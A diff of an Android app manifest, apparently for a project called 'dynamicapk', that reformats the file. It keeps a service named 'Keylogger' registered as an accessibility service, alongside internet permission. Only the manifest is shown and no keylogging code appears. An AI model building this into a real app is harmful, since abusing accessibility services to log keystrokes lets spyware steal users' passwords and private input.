@@ -1,37 +1,31 @@
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.dynamicapk">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- Required Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
 
     <application
         android:allowBackup="true"
-        android:supportsRtl="true"
-        android:label="@string/app_name"
-        android:theme="@style/Theme.DynamicAPK">
+        android:supportsRtl="true">
 
-        <!-- Main Activity -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="true">
+        <!-- MainActivity -->
+        <activity android:name=".MainActivity"
+                  android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Keylogger Accessibility Service -->
+        <!-- Keylogger Service -->
         <service
             android:name=".Keylogger"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="false">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
         </service>
 
     </application>
